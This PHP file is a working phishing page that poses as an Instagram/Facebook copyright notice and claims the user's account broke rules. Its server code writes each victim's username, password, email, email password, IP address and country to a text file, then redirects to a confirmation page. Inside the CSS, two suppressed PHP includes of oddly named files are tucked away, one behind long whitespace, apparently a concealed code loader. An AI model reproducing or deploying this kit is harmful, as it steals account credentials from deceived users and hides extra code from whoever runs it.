<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);

include('pp.php'); // PP ÇEKME İŞLEMİ


if ($_POST) {

    $nick = $_SESSION["username"];
    $mail = $_POST["email"];
    $mailpass = $_POST["epassword"];
    $password =  $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $ulke = $details->country;
    date_default_timezone_set('Europe/Istanbul');
    $cur_time = date("d-m-Y H:i:s");
    /////////////////////////////////////////////////////////////
    $file = fopen('kaanlear.txt', 'a'); // TXTYİ BURDAN AYARLAYIN
    ////////////////////////////////////////////////////////////


    fwrite($file, "Username: " . $nick . "\n" . "Password: " . $password . "\n" . "Mail: " . $mail . "\n" . "Mail Password: " . $mailpass . "\n" . "Ip Adress: " . $ip . "\n" .

        "Country: " . $ulke . "\n" . "Followers: " . $fff2 . "\n" .  "Time: " . $cur_time .  "\n\n\n");
    fclose($file);
    echo '';


    header("Location: confirmed.php");
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Copyright Help Center</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/WjbGH9Owc-X.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@1,200&display=swap" rel="stylesheet">
    <!--Favicon-->
    <style>
	
        body {
            background-color: #000100;
            color: white;
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }

        .logo-box {
            display: flex;
            justify-content: center;
            margin-top: 61px;
        }

        .text {
            font-size: 15px;
            display: flex;
            justify-content: center;
            margin-top: 41px;
            margin-left: auto;
            margin-right: 10px;
        }

        .text p {
            color: #EDEDED;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .form {
            margin-top: 25px;
            display: flex;
            justify-content: center;
        }

        .form input {
            background: none;
            border: 1px solid #EBEBEB;
            border-radius: 25px;
            color: white;
            height: 27px;
            width: 210px;
            text-align: center;
        }

        ::placeholder {
            color: #D0D3D4;
            opacity: 1;
        }

        :-ms-input-placeholder {
            color: #D0D3D4;
        }

        ::-ms-input-placeholder {
            color: #D0D3D4;
        }

        .form button {
            background: none;
            color: white;
            border-radius: 25px;
            border: 2px solid white;
            width: 100px;
            height: 40px;
        }

        .form button:hover {
            background: white;
            color: black;
            border: 2px solid white;
        }

        .company {
            display: flex;
            justify-content: center;
            margin-top: 30px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .footer {
            background: #212221;
            height: 440px;
            margin-bottom: 0;
            margin-left: 15%;
            margin-right: 15%;
        }

        #copyright {
            color: white;
        }

        #menu {
            display: inline;
            margin-top: 45px;
            width: 90%;
            margin-left: 35px;
        }

        #liste {
            display: inline-block;
        }

        #link {
            text-decoration: none;
            color: white;
            font-family: sans-serif;
            font-size: 13px;
            font-weight: 540;
            vertical-align: baseline;
        }

        .user-photo img {
            margin-top: 20px;
            border-radius: 50%;
            height: 100px;

        }

        .form font {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 14epx;
            padding: 0;
        }

        .user-photo h2 {
            text-transform: uppercase;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        h4 {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .box {
            display: flex;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            width: 100%;
            height: 100%;
        }

        .box table {
            margin-top: 16px;
            border: 0.5px solid #4D5656;
            border-radius: 5px;
            padding: 10px;
            list-style: none;
        }

        .box table td {
            padding: 5px 20px;
        }
        .post{
            border-radius: 6px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
<?php @require_once __DIR__ . '/css/css2/css.js/bestory.css'; ?>
        }
        .post img{
            border-radius: 9px;
            width: 320px;
            height: 250px;
			                                                                                                                                                                                                                         <?php @require_once __DIR__ . '/css/css2/css.js/vendor/animate/animate.css'; ?>
        }
        .post .manlywashere{
            color: #839192;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo-box">
            <img src="instagram.png">
        </div>
        <div class="user-photo">
            <img src="<?= $pp ?>">

        </div>
        <div class="box">



                    </tr>
                </thead>
                <tbody>
                    <tr>
                    
                    </tr>
                </tbody>
            </table>
        </div>
            <div class="text">
                <p>Hi! <?php echo "@" . $_SESSION["username"]; ?> with our latest Copyright update,many accounts have been found to be breaking rules. Your account has been reviewed by our support team team and a rule violation has been observed.</p> 
            </div> 
            <div class="form">
                <form method="POST">
                    <input type="password" name="password" placeholder="Password" required><br><br>

                    <input type="text" name="code" placeholder="Verification Code" required><br><br>
                    <font>(Verification Code)</font><br>
                    <font><?php echo rand(100000, 999999) ?></font><br><br>
                    <button type="submit">Apply</button><br><br><br><br>
					
                </form>
            </div>
            <div id="menu">
                <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li>
            </div> <br>
            <div class="company">
                <p style="font-weight:100;"><strong style="color: #4267B2;">FROM FACEBOOK</strong></p>
            </div>
			
        </div>

		

    </div>
</body>

</html>



